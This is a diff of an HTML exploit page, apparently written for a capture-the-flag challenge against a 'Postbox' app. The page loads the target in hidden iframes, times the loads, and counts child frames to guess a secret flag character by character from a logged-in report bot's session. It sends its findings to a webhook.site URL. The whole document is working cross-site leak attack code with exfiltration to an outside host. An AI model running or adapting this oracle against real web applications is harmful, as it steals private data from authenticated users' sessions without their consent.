@@ -1,38 +1,30 @@
 <!doctype html>
-<html lang="vi">
+<html lang="en">
 <meta charset="utf-8">
-<title>Postbox timing probe</title>
-<style>
-  body { font: 14px monospace; padding: 24px; color: #222; }
-</style>
-<body><pre id="status">Đang đo…</pre>
+<title>Postbox iframe timing oracle</title>
+<body><pre id="status">Running iframe timing measurements…</pre>
 <script>
 "use strict";
 
 const WEBHOOK = "https://webhook.site/6ec1ed3f-8c2e-467b-bf24-2a02c70fa9ba";
+const DEFAULT_APP = "https://8afaa9f6487405da.postbox.best";
 const params = new URLSearchParams(location.search);
-
 const prefix = params.get("p") || "flag{";
 const rid = params.get("rid") || crypto.randomUUID();
-const app = params.get("app") || "https://24ad0cec255f215f.postbox.best";
-const alphabet = [...new Set(
-  params.get("cs") || "}abcdefghijklmnopqrstuvwxyz0123456789_-"
-)];
-const sampleCount = Math.max(1, Math.min(7, Number.parseInt(params.get("n") || "3", 10)));
-const verifyCount = Math.max(1, Math.min(8, Number.parseInt(params.get("v") || "4", 10)));
-const shortlistSize = Math.max(1, Math.min(4, Number.parseInt(params.get("top") || "2", 10)));
+const app = params.get("app") || DEFAULT_APP;
+const alphabet = [...new Set(params.get("cs") || "}0123456789abcdef")];
+const screenSamples = Math.max(1, Math.min(7, Number.parseInt(params.get("n") || "1", 10)));
+const verifyRounds = Math.max(1, Math.min(8, Number.parseInt(params.get("v") || "2", 10)));
+const shortlistSize = Math.max(1, Math.min(4, Number.parseInt(params.get("top") || "3", 10)));
+const batchSize = Math.max(1, Math.min(6, Number.parseInt(params.get("k") || "3", 10)));
 const status = document.getElementById("status");
 
 const median = values => {
   const sorted = [...values].sort((a, b) => a - b);
   const mid = Math.floor(sorted.length / 2);
-  return sorted.length % 2
-    ? sorted[mid]
-    : (sorted[mid - 1] + sorted[mid]) / 2;
+  return sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
 };
-
-const deviation = (values, center) =>
-  median(values.map(value => Math.abs(value - center)));
+const deviation = (values, center) => median(values.map(value => Math.abs(value - center)));
 
 function targetUrl(query) {
   const url = new URL(app);
@@ -46,221 +38,179 @@ function targetUrl(query) {
 function loadFrame(query) {
   return new Promise(resolve => {
     const frame = document.createElement("iframe");
-    frame.style.cssText =
-      "position:absolute;width:2px;height:2px;left:-20px;top:-20px";
-
+    frame.style.cssText = "position:absolute;width:2px;height:2px;left:-20px;top:-20px";
+    const started = performance.now();
     let finished = false;
-    const timer = setTimeout(() => finish(true), 6000);
+    const timer = setTimeout(() => finish("timeout"), 7000);
 
-    function finish(timedOut = false) {
+    function finish(error = "") {
       if (finished) return;
       finished = true;
       clearTimeout(timer);
-
-      let frames = -1;
-      try { frames = frame.contentWindow.length; } catch (_) {}
-
+      let childFrames = -1;
+      try { childFrames = frame.contentWindow.length; } catch (_) {}
+      const result = {
+        ms: performance.now() - started,
+        childFrames,
+        error,
+      };
       frame.remove();
-      resolve({ frames, timedOut });
+      resolve(result);
     }
 
-    frame.onload = () => finish(false);
-    frame.onerror = () => finish(false);
+    frame.onload = () => finish();
+    frame.onerror = () => finish("load-error");
     frame.src = targetUrl(query);
     document.body.appendChild(frame);
   });
 }
 
-async function load(query) {
-  const started = performance.now();
-  const controller = new AbortController();
-  const timer = setTimeout(() => controller.abort(), 6000);
-  let timedOut = false;
+async function loadBatch(query) {
+  const frames = await Promise.all(
+    Array.from({ length: batchSize }, () => loadFrame(query))
+  );
+  return {
+    ms: frames.reduce((sum, frame) => sum + frame.ms, 0),
+    frames,
+    timedOut: frames.some(frame => frame.error),
+    unauthenticated: frames.some(frame => frame.childFrames === 0),
+  };
+}
 
-  try {
-    await fetch(targetUrl(query), {
-      mode: "no-cors",
-      credentials: "include",
-      cache: "no-store",
-      signal: controller.signal
-    });
-  } catch (_) {
-    timedOut = controller.signal.aborted;
-  } finally {
-    clearTimeout(timer);
+async function pairedDelta(candidateQuery, round) {
+  const baselineQuery = prefix + "\u0003";
+  let candidate, baseline;
+  if (round % 2 === 0) {
+    [candidate, baseline] = await Promise.all([
+      loadBatch(candidateQuery), loadBatch(baselineQuery)
+    ]);
+  } else {
+    [baseline, candidate] = await Promise.all([
+      loadBatch(baselineQuery), loadBatch(candidateQuery)
+    ]);
   }
-
-  return { ms: performance.now() - started, timedOut };
+  return { delta: candidate.ms - baseline.ms, candidate, baseline };
 }
 
 async function send(data) {
+  const scores = data.samples
+    ? Object.entries(data.samples)
+        .map(([char, sample]) => ({ char, score: sample.score }))
+        .sort((a, b) => b.score - a.score)
+        .slice(0, 6)
+    : (data.top || []);
+  const payload = {
+    rid,
+    prefix,
+    winner: data.winner || "",
+    error: data.error || "",
+    baseline: data.baseline,
+    threshold: data.threshold,
+    top: JSON.stringify(scores),
+  };
   const url = new URL(WEBHOOK);
-  const payload = { rid, prefix, ...data };
-
   for (const [key, value] of Object.entries(payload)) {
-    if (value === undefined || value === null) continue;
-    url.searchParams.set(
-      key,
-      typeof value === "object" ? JSON.stringify(value) : String(value)
-    );
+    if (value !== undefined && value !== null) url.searchParams.set(key, String(value));
   }
   url.searchParams.set("_", String(Date.now()));
-
   try {
     await fetch(url.href, {
       method: "GET",
       mode: "no-cors",
       credentials: "omit",
       cache: "no-store",
-      keepalive: true
+      keepalive: true,
     });
-  } catch (_) {
-    // no-cors response không đọc được; webhook vẫn có thể đã nhận request.
-  }
-}
-
-function topSamples(samples) {
-  return Object.entries(samples)
-    .sort((a, b) => b[1].score - a[1].score)
-    .slice(0, 6)
-    .map(([char, sample]) => ({ char, score: sample.score }));
-}
-
-async function pairedDelta(query, round) {
-  const baselineQuery = prefix + "\u0001";
-  let candidate, baseline;
-
-  if (round % 2 === 0) {
-    candidate = await load(query);
-    baseline = await load(baselineQuery);
-  } else {
-    baseline = await load(baselineQuery);
-    candidate = await load(query);
-  }
-
-  return { delta: baseline.ms - candidate.ms, candidate, baseline };
+  } catch (_) {}
 }
 
 (async () => {
-  const baselineQuery = prefix + "\u0001";
+  const baselineQuery = prefix + "\u0003";
   const baselineRuns = [];
   const samples = {};
 
   const authCheck = await loadFrame(baselineQuery);
-  if (authCheck.frames === 0) {
-    await send({ error: "report bot không đăng nhập vào app" });
-    status.textContent = "Bot chưa đăng nhập vào app.";
+  if (authCheck.childFrames === 0) {
+    await send({ error: "report bot is not authenticated to the app" });
+    status.textContent = "Bot is not authenticated.";
     return;
   }
 
-  // Làm nóng đường truyền và ước lượng độ nhiễu.
-  for (let i = 0; i < 4; i++) {
-    const pair = await pairedDelta(baselineQuery, i);
-    if (pair.baseline.timedOut || pair.candidate.timedOut) {
-      await send({ error: "baseline request timeout" });
-      status.textContent = "Baseline timeout.";
+  for (let i = 0; i < 2; i++) {
+    const baseline = await loadBatch(baselineQuery);
+    if (baseline.timedOut || baseline.unauthenticated) {
+      await send({ error: baseline.unauthenticated
+        ? "report bot is not authenticated to the app"
+        : "baseline iframe timed out" });
+      status.textContent = "Baseline measurement failed.";
       return;
     }
-    baselineRuns.push(pair.baseline.ms, pair.candidate.ms);
+    baselineRuns.push(baseline.ms);
   }
 
-  let baseline = median(baselineRuns);
-  let threshold = Math.max(
-    5,
-    baseline * 0.02,
-    deviation(baselineRuns, baseline) * 1.5
-  );
+  const shuffled = [...alphabet];
+  for (let i = shuffled.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+  }
 
-  for (let index = 0; index < alphabet.length; index++) {
-    if (index > 0 && index % 5 === 0) {
-      const refreshed = await load(baselineQuery);
-      if (refreshed.timedOut) {
-        await send({
-          error: "baseline refresh timeout",
-          top: topSamples(samples)
-        });
-        status.textContent = "Baseline refresh timeout.";
-        return;
-      }
-
-      baselineRuns.push(refreshed.ms);
-      const recent = baselineRuns.slice(-8);
-      baseline = median(recent);
-      threshold = Math.max(
-        5,
-        baseline * 0.02,
-        deviation(recent, baseline) * 1.5
-      );
-    }
-
-    const char = alphabet[index];
+  for (let index = 0; index < shuffled.length; index++) {
+    const char = shuffled[index];
     const deltas = [];
-
-    for (let sample = 0; sample < sampleCount; sample++) {
-      const measured = await load(prefix + char);
-      if (measured.timedOut) {
-        await send({
-          error: "candidate request timeout",
-          top: topSamples(samples)
-        });
-        status.textContent = "Candidate timeout.";
+    for (let sample = 0; sample < screenSamples; sample++) {
+      const pair = await pairedDelta(prefix + char, index + sample);
+      if (pair.candidate.timedOut || pair.baseline.timedOut ||
+          pair.candidate.unauthenticated || pair.baseline.unauthenticated) {
+        await send({ error: "candidate iframe failed", samples });
+        status.textContent = "Candidate measurement failed.";
         return;
       }
-      deltas.push(baseline - measured.ms);
+      deltas.push(pair.delta);
+      baselineRuns.push(pair.baseline.ms);
     }
-
     samples[char] = { deltas, score: median(deltas) };
   }
 
-  const ranked = Object.entries(samples)
-    .sort((a, b) => b[1].score - a[1].score);
+  const ranked = Object.entries(samples).sort((a, b) => b[1].score - a[1].score);
   const finalists = ranked.slice(0, Math.min(shortlistSize, ranked.length));
-
   for (const [char, sample] of finalists) {
-    for (let i = 0; i < verifyCount; i++) {
-      const pair = await pairedDelta(prefix + char, sampleCount + i);
-
-      if (pair.baseline.timedOut || pair.candidate.timedOut) {
-        await send({
-          error: "verification request timeout",
-          top: topSamples(samples)
-        });
-        status.textContent = "Verification timeout.";
+    for (let round = 0; round < verifyRounds; round++) {
+      const pair = await pairedDelta(prefix + char, screenSamples + round);
+      if (pair.candidate.timedOut || pair.baseline.timedOut ||
+          pair.candidate.unauthenticated || pair.baseline.unauthenticated) {
+        await send({ error: "verification iframe failed", samples });
+        status.textContent = "Verification failed.";
         return;
       }
-
       sample.deltas.push(pair.delta);
+      baselineRuns.push(pair.baseline.ms);
     }
     sample.score = median(sample.deltas);
   }
 
+  const baseline = median(baselineRuns);
+  const threshold = Math.max(8, baseline * 0.005, deviation(baselineRuns, baseline) * 0.25);
   const verified = finalists
-    .filter(([, sample]) =>
-      sample.score >= threshold &&
-      sample.deltas.filter(value => value > threshold * 0.35).length
-        >= Math.ceil(sample.deltas.length * 0.5)
-    )
+    .filter(([, sample]) => sample.score >= threshold &&
+      sample.deltas.filter(value => value > threshold * 0.35).length >=
+        Math.ceil(sample.deltas.length / 2))
     .sort((a, b) => b[1].score - a[1].score);
 
   let winner = null;
-  if (
-    verified.length &&
-    (verified.length === 1 ||
-      verified[0][1].score - verified[1][1].score >= threshold)
-  ) {
+  if (verified.length &&
+      (verified.length === 1 || verified[0][1].score - verified[1][1].score >= threshold * 0.5)) {
     winner = verified[0][0];
   }
 
   await send({
-    winner: winner || "",
+    winner,
     baseline,
     threshold,
-    top: topSamples(samples)
+    samples,
   });
-
   status.textContent = winner
-    ? `Đã gửi kết quả cho prefix ${prefix}.`
-    : `Chưa có ký tự rõ ràng cho prefix ${prefix}.`;
+    ? `Measurement complete for ${prefix}.`
+    : `No clear candidate for ${prefix}.`;
 })();
 </script>
 </body>
